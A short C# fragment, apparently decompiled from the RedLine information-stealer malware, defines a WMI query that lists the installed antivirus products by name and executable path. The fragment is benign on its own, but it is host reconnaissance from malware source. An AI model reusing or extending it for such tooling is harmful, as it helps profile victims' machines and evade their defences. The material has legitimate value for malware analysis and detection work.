using System;

namespace RedLine.Models.WMI
{
	// Token: 0x0200001F RID: 31
	public class WmiAntivirusQuery : WmiQueryBase
	{
		// Token: 0x060000CA RID: 202 RVA: 0x00003E43 File Offset: 0x00002043
		public WmiAntivirusQuery() : base("AntivirusProduct", null, new string[]
		{
			"displayName",
			"pathToSignedProductExe"
		})
		{
		}
	}
}
